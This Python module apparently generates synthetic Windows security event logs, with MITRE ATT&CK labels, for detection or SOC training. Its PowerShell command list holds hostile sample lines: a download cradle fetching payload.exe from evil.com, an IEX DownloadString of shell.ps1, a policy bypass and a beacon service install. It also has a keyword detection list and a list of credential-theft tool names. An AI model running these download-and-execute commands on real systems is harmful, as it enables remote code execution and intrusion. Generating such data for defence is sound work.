"""
Windows telemetry log generator.
Generates realistic Windows Security, PowerShell, and System event logs.
"""
import random
from datetime import datetime, timezone

USERS = ["jsmith", "admin", "svc_backup", "mary.jones", "helpdesk",
         "administrator", "guest", "svc_sql", "domain_admin", "analyst1",
         "john.doe", "bob.wilson", "karen.lee", "svc_web", "test_user"]

HOSTNAMES = ["DC01", "WS-PC001", "WS-PC002", "WS-PC003", "WS-LAPTOP01",
             "FILE-SRV01", "SQL-SRV01", "WEB-SRV01", "EXCHANGE01", "WS-PC004",
             "DEV-WS01", "HR-PC01", "FIN-PC01", "EXEC-LT01", "IT-PC01"]

DOMAINS = ["CORPSOC", "ACME", "INTERNAL"]

EXTERNAL_IPS = ["203.0.113.5", "198.51.100.23", "192.0.2.100", "45.33.32.156",
                "185.220.101.1", "91.219.236.222", "104.244.72.115", "5.255.99.2"]

POWERSHELL_COMMANDS = [
    "Get-Process", "Get-EventLog -LogName Security",
    "Invoke-WebRequest -Uri http://evil.com/payload.exe",
    "IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/shell.ps1')",
    "Set-ExecutionPolicy Bypass -Scope Process",
    "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
    "Get-ADUser -Filter *",
    "New-Service -Name 'svc_update' -BinaryPathName 'C:\\temp\\beacon.exe'",
]

SUSPICIOUS_PROCESSES = ["mimikatz.exe", "lazagne.exe", "procdump.exe", "psexec.exe"]
SERVICE_NAMES = ["Windows Update Service", "svc_backup_agent", "WebHelper", "SystemHealthMonitor"]


def _rip(internal=True):
    if internal:
        return f"10.{random.randint(0,5)}.{random.randint(0,255)}.{random.randint(1,254)}"
    return random.choice(EXTERNAL_IPS)


def generate_failed_login():
    src = _rip(random.random() > 0.3)
    u, h = random.choice(USERS), random.choice(HOSTNAMES)
    return {
        "timestamp": datetime.now(timezone.utc).isoformat(), "source": "windows",
        "source_ip": src, "destination_ip": _rip(), "event_type": "failed_login",
        "event_id": "4625", "severity": "medium", "hostname": h, "username": u,
        "process_name": "winlogon.exe",
        "raw_log": f"EventID=4625 | Failed logon | User: {random.choice(DOMAINS)}\\{u} | Source: {src} | Host: {h}",
        "mitre_tactic": "Credential Access", "mitre_technique": "T1110",
        "mitre_technique_name": "Brute Force", "is_malicious": random.choice([0, 1]),
    }


def generate_successful_login():
    src = _rip(random.random() > 0.2)
    u, h = random.choice(USERS), random.choice(HOSTNAMES)
    return {
        "timestamp": datetime.now(timezone.utc).isoformat(), "source": "windows",
        "source_ip": src, "destination_ip": _rip(), "event_type": "successful_login",
        "event_id": "4624", "severity": "info", "hostname": h, "username": u,
        "process_name": "winlogon.exe",
        "raw_log": f"EventID=4624 | Successful logon | User: {random.choice(DOMAINS)}\\{u} | Source: {src} | Host: {h}",
        "mitre_tactic": "Initial Access", "mitre_technique": "T1078",
        "mitre_technique_name": "Valid Accounts", "is_malicious": 0,
    }


def generate_powershell_execution():
    u, h = random.choice(USERS), random.choice(HOSTNAMES)
    cmd = random.choice(POWERSHELL_COMMANDS)
    is_sus = any(k in cmd.lower() for k in ["enc", "iex", "downloadstring", "bypass", "evil"])
    return {
        "timestamp": datetime.now(timezone.utc).isoformat(), "source": "windows",
        "source_ip": _rip(), "event_type": "powershell_execution",
        "event_id": "4104", "severity": "high" if is_sus else "info",
        "hostname": h, "username": u, "process_name": "powershell.exe",
        "process_id": random.randint(1000, 65000), "command_line": cmd,
        "raw_log": f"EventID=4104 | ScriptBlock: {cmd} | User: {u} | Host: {h}",
        "mitre_tactic": "Execution", "mitre_technique": "T1059.001",
        "mitre_technique_name": "PowerShell", "is_malicious": 2 if is_sus else 0,
    }


def generate_privilege_escalation():
    u, h = random.choice(USERS[:5]), random.choice(HOSTNAMES)
    priv = random.choice(["SeDebugPrivilege", "SeImpersonatePrivilege", "SeBackupPrivilege"])
    return {
        "timestamp": datetime.now(timezone.utc).isoformat(), "source": "windows",
        "source_ip": _rip(), "event_type": "privilege_escalation",
        "event_id": "4672", "severity": "high", "hostname": h, "username": u,
        "process_name": "lsass.exe",
        "raw_log": f"EventID=4672 | Special privileges assigned | User: {u} | Priv: {priv} | Host: {h}",
        "mitre_tactic": "Privilege Escalation", "mitre_technique": "T1548",
        "mitre_technique_name": "Abuse Elevation Control Mechanism", "is_malicious": 1,
    }


def generate_service_creation():
    h = random.choice(HOSTNAMES)
    is_sus = random.random() > 0.6
    binary = f"C:\\temp\\{random.choice(SUSPICIOUS_PROCESSES)}" if is_sus else "C:\\Windows\\System32\\svchost.exe"
    svc = random.choice(SERVICE_NAMES)
    return {
        "timestamp": datetime.now(timezone.utc).isoformat(), "source": "windows",
        "source_ip": _rip(), "event_type": "service_creation",
        "event_id": "7045", "severity": "high" if is_sus else "low",
        "hostname": h, "username": "SYSTEM", "process_name": "services.exe",
        "raw_log": f"EventID=7045 | New service: {svc} | Binary: {binary} | Host: {h}",
        "mitre_tactic": "Persistence", "mitre_technique": "T1543.003",
        "mitre_technique_name": "Windows Service", "is_malicious": 2 if is_sus else 0,
    }


WINDOWS_GENERATORS = [
    (generate_failed_login, 30), (generate_successful_login, 25),
    (generate_powershell_execution, 20), (generate_privilege_escalation, 15),
    (generate_service_creation, 10),
]


def generate_windows_log():
    gens, weights = zip(*WINDOWS_GENERATORS)
    return random.choices(gens, weights=weights, k=1)[0]()
